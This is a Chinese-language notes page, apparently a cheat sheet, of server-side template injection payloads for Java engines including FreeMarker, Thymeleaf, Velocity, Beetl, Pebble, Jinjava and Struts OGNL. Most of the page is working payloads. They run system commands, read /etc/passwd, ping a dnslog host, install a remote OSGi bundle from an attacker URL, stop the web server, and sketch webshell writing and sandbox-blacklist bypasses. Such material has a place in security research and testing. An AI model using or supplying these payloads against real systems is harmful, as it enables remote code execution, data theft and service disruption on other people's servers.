# Java模板注入


## 0x01 目录
大概看了一下，有这么几种模板

 - FreeMarker模板

   ```java
   <ul>
   <#list .data_model?keys as key>
   <li>${key}</li>
   </#list>
   </ul>
   ${.data_model.keySet()}   
   ```
   列举spring的Beans

   ```
   <#assign ctx=springMacroRequestContext> 
   <#list ctx.webApplicationContext.getBeanDefinitionNames() as item> 
   <p><b>${item}</b> - 
   <#attempt>${ctx.webApplicationContext.getBeanDefinition(item).beanClass} 
   <#recover>no class</#attempt></p> 
   </#list> 
   ```

   

 - Thymeleaf模板

   ```java
   SpringEL: ${T(java.lang.Runtime).getRuntime().exec('calc')}
   OGNL: ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
   ```

 - jsp模板(el表达式)

 - Velocity模板

   ```java
   <ul>
   #foreach( $key in $context.keys )
   <li>$key = $context.get($key)</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getSession(true).getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getServletContext().getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   ```

 - beetl模板

   `byteCTF2021考过`

   ```
   http://ibeetl.com/beetlonline/
   https://landgrey.me/blog/17/
   JfinalCMS: https://xz.aliyun.com/t/8695
   ```

   ```${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"ping 029bzv.dnslog.cn")} ```

   bypass: https://ma4ter.cn/2682.html

   ```
   https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/
   ```

 - Pebble模板

   https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/

   https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/

   > 和spring的关系: https://pebbletemplates.io/wiki/guide/spring-boot-integration/#access-to-spring-beans

   Java 9+

   ```
   {% set cmd = 'id' %}
   {% set bytes = (1).TYPE
        .forName('java.lang.Runtime')
        .methods[6]
        .invoke(null,null)
        .exec(cmd)
        .inputStream
        .readAllBytes() %}
   {{ (1).TYPE
        .forName('java.lang.String')
        .constructors[0]
        .newInstance(([bytes]).toArray()) }}
   ```

   JDK8

   ```
   {% set out = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec("whoami").inputStream %}
   [{% for i in range(1,99) %}{% set byte = out.read() %}{{ byte }},{% endfor %}]
   ```

 - Jinjava

   `CVE-2020-12668`

   poc

   ```
   {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("")}}
   ```

   ```
   {{'a'.getClass().forName('java.lang.Runtime').methods[6].invoke(null).exec("calc")}}
   ```

   ```
   https://securitylab.github.com/advisories/GHSL-2020-072-hubspot_jinjava/
   ```

 - 在实际环境种获取classLoader的方法

   ```javascript
   ● java.lang.Class.getClassLoader()
   ● java.lang.Thread.getCurrentClassLoader()
   ● java.lang.ProtectionDomain.getClassLoader()
   ● javax.servlet.ServletContext.getClassLoader()
   ● org.osgi.framework.wiring.BundleWiring.getClassLoader()
   ● org.springframework.context.ApplicationContext.getClassLoader()
   ```

## 0x02 拓展

### bypass思路

- 模板黑名单之外的能任意执行代码的对象

  1. 如果我们能够本地debug，寻找就会变得比较容易

  2. 如果不能，解决方案:`读文档`,`暴力枚举`，`文档API可以列举对象的方法(已经在0x01中提及)`

  3. 常见的一些危险的对象

     1. [classLoader](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/WebResourceRoot.html)

        ```
        ${any_object.class.classLoader}//需要任意类型的实例
        ${request.servletContext.classLoader} //可以下载一些配置文件和jar包
        ```

        比如按照下面这种方式读文件

        ```
        <#assign uri = classLoader.getResource("META-INF").toURI() > 
        <#assign url = uri.resolve("file:///etc/passwd").toURL() > 
        <#assign bytes = url.openConnection().inputStream.readAllBytes() > 
        ${bytes} 
        ```

     2. Web Application ClassLoaders 

        **Tomcat**（org.apache.catalina.loader.WebappClassLoader)

        > `getResources()`==>[WebResourceRoot](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/WebResourceRoot.html)
        >
        > - write(String path,InputStream is, boolean overwrite)
        >
        >   可以在请求路径下面使用`is`来写入webshell
        >
        > - getContext()==>`getInstanceManager()`
        >
        >   运行我们实例化任何对象

        **Jetty**（org.eclipse.jetty.webapp.WebAppClassLoader）`

        > `getContext`==>`WebAppContext`==>`getObjectFactory`
        >
        > ​	允许我们实例化任何对象

        **GlassFish**(org.glassfish.web.loader.WebappClassLoader)

        > `getResources()`==>`javax.naming.directory.DirContext`==>`lookup`

        **WebLogic**(weblogic.utils.classloaders.GenericClassLoader)

        > `defineCodeGenClass(String className,byte[] bytes, URL codebase)`
        >
        >  允许我们动态加载任意类~~

        **WebSphere**(com.ibm.ws.classloader.CompoundClassLoader)

        > `defineApplicationClass(String className, byte[] bytecode)`
        >
        > ​	允许攻击者定义和加载类，但是不会对他进行实例化，如果要利用的话`获取静态方法，变量`或者`java.lang.Class.forName(string, true, ClassLoader)加载`

        **Tomcat, Jetty, GlassFish**(java.net.URLClassLoader)

        > `newInstance`：可以远程加载jar包

     3. Instance Managers(实例管理对象)/Object Factories

        ● org.apache.catalina.InstanceManager 
        ● org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManager 
        ● org.eclipse.jetty.util.DecoratedObjectFactory

        **Tomcat**

        ```
        $request.servletContext.classLoader.resources.context.instanceManager 
        ```

        Jetty

        ```
        $request.servletContext.classLoader.context.objectFactory 
        ```

     4. Spring Application Context

        `org.springframework.web.context.WebApplicationContext.ROOT`===>` ApplicationContext`

        `springMacroRequestContext#webApplicationContext`===>`ApplicationContext`

        ```
        ${springMacroRequestContext.webApplicationContext} 
        ```

        **利用:**

        > - getClassLoader()
        >
        > - getServletContext()
        >
        >   返回ServletContext，我们可以利用这个来创建一些新的对象
        >
        > - getWebServer()
        >
        >   可以控制整个Web Server,使我们可以关掉它？
        >
        >   `${Application['org.springframework.web.context.WebApplicationContext.ROOT'].getWebServer().stop()}`
        >
        > - getEnvironment()
        >
        >   可以获取环境变量和系统配置选项
        >
        >   `Application['org.springframework.web.context.WebApplicationContext.ROOT'].environment.systemProperties`
        >
        >   `Application['org.springframework.web.context.WebApplicationContext.ROOT'].environment.systemEnvironment`
        >
        > - getBeanFactory()/getBean(String name)
        >
        >   这个方法让我们可以获取在`Application Context`中注册的数据
        >
        
        JSON/XML unmarshallers: 
        
        ```
        <#assign ctx=springMacroRequestContext> 
        <#assign mapper=ctx.webApplicationContext.getBean('jacksonObjectMapper')> 
        <#assign classloader=ctx.webApplicationContext.classLoader> 
        <#assign smc=classloader.loadClass('javax.script.ScriptEngineManager')> 
        ${mapper.enableDefaultTyping().readValue("{}",smc).getEngineByName('js').eval('CODE')} 
        ```
        
     5. Thread
     
        `getContextClassLoader()`
     
     6. Tomcat WebResourceRoot
     
        `getBaseUrls()`
     
        `mkdir()`
     
     7. OSGI Bundle Context
     
        加载攻击者远程提供的`Bundle`并且`start`
     
        ```
        #set($location = "https://attack.er/pwnbundle.jar" ) 
        #set($bundleAttr = "org.osgi.framework.BundleContext" ) 
        #set($servletContext = $request.servletContext() ) 
        #set($bundleContext = $servletContext.getAttribute($bundleAttr) ) 
        #set($bundle = $bundleContext.installBundle($location)) 
        <p>$bundle.getBundleId()</p> 
        <p>$bundle.getSymbolicName()</p> 
        <p>$bundle.getState()</p> 
        <p>$bundle.start(3)</p> 
        <p>$bundle.getState()</p> 
        <p>$bundle.uninstall()</p> 
        ```
     
     8. JSON/XML Unmarshallers
     
        `Liferay`
     
        ```
        <#assign cl=jsonFactoryUtil.protectionDomain.classLoader> 
        <#assign c=cl.loadClass("javax.script.ScriptEngineManager")> 
        <#assign deser=jsonFactoryUtil.createJSONDeserializer()> 
        <#assign sm=deser.deserialize("{}", c)> 
        ```
     
        利用Spring的属性
     
        ```
        <#assign attr='org.springframework.web.context.WebApplicationContext.ROOT'> 
        <#assign ac=Application[attr]> 
        <#assign jf=ac.getBean('com.liferay.portal.kernel.json.JSONFactory')> 
        <#assign wl=jf.getLiferayJSONDeserializationWhitelist()> 
        <#assign VOID=wl.register("javax.script.ScriptEngineManager")> 
        <#assign sm=jf.deserialize('{"javaClass":"javax.script.ScriptEngineManager"}')> 
        ```
     
     9. Struts Action
     
        `getText(String aTextName)`
     
        ```
        $action.getText("foo","${@java.lang.Runtime@getRuntime().exec('touch /tmp/pwned')}", null)
        ```
     
     10. Struts OgnIValueStack
     
         获取
     
        > ● Directly exposed to the context, such as: \$stack 
        >
        > ● \$req.getAttribute('webwork.valueStack') 
        > ● $application.getAttribute('com.opensymphony.xwork.DefaultActionInvocation').getStack() 
     
     ​	利用
     
     ```jade
     $stack.findValue("@java.lang.Runtime@getRuntime().exec('touch /tmp/pwned')")
     ```
     
     11. Struts DefaultActionInvocation
     
         `getAction()`
     
         `getStack()`
     
     12. Struts OgnlTool
     
         `findValue(String expr, Object context)`:执行任意的`OGNL`表达式
     
     13. VelocityWebWorkUtil
     
         `evaluate(Stirng expr)`
     
     14. FreeMarker StaticModels 
     
         暴露静态方法的两个步骤
     
         ```
         model.addAttribute("statics", new DefaultObjectWrapperBuilder(new 
         Version("2.3.30")).build().getStaticModels()); 
         ```
     
         ```
         TemplateHashModel staticModels = wrapper.getStaticModels(); 
         newConfig.setSharedVariable("statics", staticModels);
         ```
     
         利用
     
         ```
         $statics["com.sun.org.apache.xerces.internal.utils.ObjectFactory"].newInstance("javax.script.ScriptEngineManager",true) 
         ```
     
     15. CamelContext
     
         `getClassResolver()`和`getInjector()`
     
         ```
         <#assign cr = camelContext.getClassResolver()> 
         <#assign i = camelContext.getInjector()> 
         <#assign semc = cr.resolveClass('javax.script.ScriptEngineManager')> 
         <#assign sem = i.newInstance()> 
         ${sem.getEngineByName("js").eval("var proc=new java.lang.ProcessBuilder('id');var is=proc.start().getInputStream(); var sc=new java.util.Scanner(is); var out=''; while (sc.hasNext()) {out += (sc.nextLine())};out")}"; 
         ```
     
  4. bypass
  
     ![image-20220616203859471](https://img.dem0dem0.top/images/image-20220616203859471.png)


参考资料

> 1.(包括了大部分的模板注入)https://cloud.tencent.com/developer/article/1771497
>
> 2. json: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
> 3. ssti: https://github.com/3em0/java_3em0/blob/master/java%E5%AE%89%E5%85%A8/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf